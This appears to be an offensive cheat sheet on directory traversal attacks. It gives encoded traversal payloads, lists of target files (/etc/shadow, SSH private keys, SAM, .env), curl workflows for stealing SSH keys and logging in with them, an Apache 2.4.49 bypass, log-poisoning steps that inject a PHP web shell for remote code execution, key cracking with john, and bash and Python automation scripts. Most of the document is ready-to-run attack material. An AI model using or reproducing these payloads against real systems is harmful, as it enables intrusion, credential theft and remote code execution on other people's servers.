# Directory Traversal (Path Traversal)

Path traversal attacks exploit insufficient input validation to access files outside the web root directory. By manipulating file paths with sequences like `../`, attackers can read sensitive system files, configuration data, and private keys.

---

## Impact

- **Information disclosure**: Access /etc/passwd, config files, logs
- **Credential theft**: Steal SSH keys, database passwords, API tokens
- **System reconnaissance**: Map file structure and running services
- **Privilege escalation**: Find credentials for lateral movement
- **Code disclosure**: Read source code for further vulnerabilities

---

## Detection & Parameter Discovery

### Common Vulnerable Parameters

```
?file=, ?page=, ?include=, ?doc=, ?path=, ?template=, ?lang=, ?locale=
?view=, ?content=, ?load=, ?read=, ?download=, ?src=, ?data=
```

### Quick Detection Payloads

```bash
# Linux targets
../../../etc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
....//....//....//etc/passwd

# Windows targets
..\..\..\windows\system32\drivers\etc\hosts
%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
....\\....\\....\\windows\\win.ini
```

---

## Linux Exploitation

### Essential Files for Reconnaissance

```bash
# System information
/etc/passwd              # User accounts and home directories
/etc/shadow              # Password hashes (if readable)
/etc/group               # Group memberships
/etc/hosts               # Network configuration
/etc/hostname            # System hostname
/proc/version            # Kernel version
/proc/cpuinfo            # CPU information

# Web server configuration
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/
/etc/nginx/nginx.conf
/var/log/apache2/access.log
/var/log/nginx/access.log

# Application files
/var/www/html/config.php
/var/www/html/.env
/home/user/.ssh/id_rsa
/home/user/.bash_history
/root/.ssh/id_rsa
```

### SSH Key Extraction Workflow

```bash
# 1. Get user list from /etc/passwd
curl "http://TARGET/app.php?file=../../../etc/passwd"

# 2. Look for users with /bin/bash or /bin/sh shells

# 3. Try to access SSH keys for each user
curl "http://TARGET/app.php?file=../../../home/username/.ssh/id_rsa"
curl "http://TARGET/app.php?file=../../../home/username/.ssh/id_dsa"
curl "http://TARGET/app.php?file=../../../home/username/.ssh/id_ecdsa"

# 4. Save key and set permissions
chmod 600 stolen_key.pem
ssh -i stolen_key.pem username@TARGET
```

### Database Credential Hunting

```bash
# Common config file locations
/var/www/html/config.php
/var/www/html/config/database.php
/var/www/html/.env
/var/www/html/application/config/database.php
/opt/lampp/etc/my.cnf
```

---

## Windows Exploitation

### Windows-Specific Targets

```bash
# System files
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM
C:\Windows\repair\SAM
C:\Windows\System32\config\SYSTEM

# IIS Web Server
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\W3SVC1\
C:\inetpub\wwwroot\App_Data\

# Application files
C:\xampp\mysql\data\mysql\user.MYD
C:\xampp\htdocs\config.php
C:\Program Files\MySQL\my.ini

# Credential locations
C:\Users\Administrator\Desktop\passwords.txt
C:\Windows\Panther\Unattend.xml
C:\Windows\System32\config\RegBack\
```

### Windows Path Variations

```bash
# Forward and back slashes
..\..\..\windows\win.ini
../../../windows/win.ini

# URL encoding
..%5c..%5c..%5cwindows%5cwin.ini
..%2f..%2f..%2fwindows%2fwin.ini

# Double encoding
%252e%252e%255c%252e%252e%255c
```

---

## Bypass Techniques & URL Encoding

### URL/Percent Encoding (Primary Bypass)

```bash
%2e%2e%2f = ../
%2e%2e%5c = ..\
%2e%2e/%2e%2e/%2e%2e/etc/passwd    # Mixed encoding
```

### Double Encoding

```bash
%252e%252e%252f = ../
%c0%ae%c0%ae%c0%af = ../
```

### Unicode Encoding

```bash
%u002e%u002e%u002f = ../
%c1%1c = ../
```

### Null Byte Injection (Older Systems)

```bash
../../../etc/passwd%00
../../../etc/passwd%00.jpg
```

### Path Truncation

```bash
../../../etc/passwd/./././././.[repeat]
```

### Overlong UTF-8

```bash
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%uff0f
```

### Alternative Separators

```bash
..;/..;/..;/etc/passwd
..\..\..\etc\passwd
```

**Why URL encoding works:** WAFs check for `../` but miss `%2e%2e%2f`. The web server decodes the request after the filter check has already passed.

---

## Real-World Example: Apache 2.4.49 CVE

```bash
# Standard payload fails (filtered)
curl http://TARGET/cgi-bin/../../../../etc/passwd
# Returns: 404 Not Found

# URL encoding bypass works
curl http://TARGET/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
# Returns: root:x:0:0:root:/root:/bin/bash...
```

---

## LFI to RCE Escalation

### Log Poisoning

```bash
# Poison User-Agent header
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://TARGET/

# Include the log file
http://TARGET/app.php?file=../../../var/log/apache2/access.log&cmd=whoami
```

### PHP Session Poisoning

```bash
# Inject PHP code into session data, then include session file
http://TARGET/app.php?file=../../../tmp/sess_[session_id]
```

### /proc/self/environ Poisoning

```bash
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://TARGET/
http://TARGET/app.php?file=../../../proc/self/environ&cmd=id
```

### File Upload + Traversal Combination

```
1. Upload shell.php.jpg (bypass extension filter)
2. Use traversal to include: ../../../uploads/shell.php.jpg
3. Execute commands via included file
```

---

## Post-Exploitation

### SSH Key Exploitation

```bash
curl "http://TARGET/app.php?file=../../../home/user/.ssh/id_rsa" > key.pem
chmod 600 key.pem
ssh -i key.pem user@TARGET

# If key is encrypted, crack it
ssh2john key.pem > key.hash
john --wordlist=rockyou.txt key.hash
```

### Configuration File Analysis

```bash
# Database credentials
grep -i "password\|user\|host\|database" config.php
grep -i "DB_PASSWORD\|DB_USER" .env

# API keys and secrets
grep -i "api_key\|secret\|token" config.php
grep -i "AWS_ACCESS_KEY\|SECRET_KEY" .env
```

### Memory/Process Inspection

```bash
/proc/self/mem
/proc/self/maps
/proc/self/fd/[0-255]
/proc/[pid]/environ
/proc/[pid]/cmdline
```

---

## Automation

### Bash Script

```bash
#!/bin/bash
TARGET="http://TARGET/app.php"
PARAM="file"
FILES=("etc/passwd" "etc/shadow" "root/.ssh/id_rsa" "var/www/html/config.php")

for depth in {1..10}; do
    PAYLOAD=$(printf "../%.0s" $(seq 1 $depth))
    for file in "${FILES[@]}"; do
        curl -s "$TARGET?$PARAM=$PAYLOAD$file" | grep -q "root:" && echo "SUCCESS: $PAYLOAD$file"
    done
done
```

### Python Script

```python
import requests

def test_traversal(url, param, payloads, files):
    for payload in payloads:
        for file in files:
            test_url = f"{url}?{param}={payload}{file}"
            try:
                response = requests.get(test_url, timeout=5)
                if "root:" in response.text or "Administrator" in response.text:
                    print(f"[+] SUCCESS: {payload}{file}")
                    return test_url
            except:
                continue
    return None

payloads = ["../", "../../", "../../../", "../../../../"]
linux_files = ["etc/passwd", "root/.ssh/id_rsa", "var/www/html/config.php"]
windows_files = ["windows/win.ini", "inetpub/wwwroot/web.config"]
```

### Burp Suite Intruder Payloads

```
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../
../../../../../../../../
```

---

## Error-Based Path Discovery

```bash
# Request a nonexistent file to reveal web root
../../../nonexistent/file
# Error: "Cannot open /var/www/html/nonexistent/file"
# Reveals web root: /var/www/html/
```

---

## Escalation Paths

- Directory Traversal -> **SSH Key Theft** -> System Access
- Directory Traversal -> **Config Files** -> Database Access
- Directory Traversal -> **Log Poisoning** -> Remote Code Execution
- Directory Traversal -> **Source Code** -> Additional Vulnerabilities
